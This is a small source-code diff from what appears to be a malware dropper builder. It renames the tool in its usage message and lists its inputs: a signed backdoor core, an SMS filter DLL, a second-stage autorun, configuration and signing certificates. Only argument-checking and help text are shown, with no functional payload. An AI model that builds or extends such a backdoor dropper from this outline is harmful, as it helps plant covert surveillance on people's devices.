@@ -20,7 +20,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	if (argc != 8) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSMDropper.exe  <core> <smsfilter> <secondstage> <config> <cert> <pfx> <output>\n\n");
+		printf("  usage:  RCSWinMoDropper.exe  <core> <smsfilter> <secondstage> <config> <cert> <pfx> <output>\n\n");
 		printf("  <core> is the backdoor signed core\n");
 		printf("  <smsfilter> is the smsfilter dll\n");
 		printf("  <secondstage> is the second stage autorun\n");
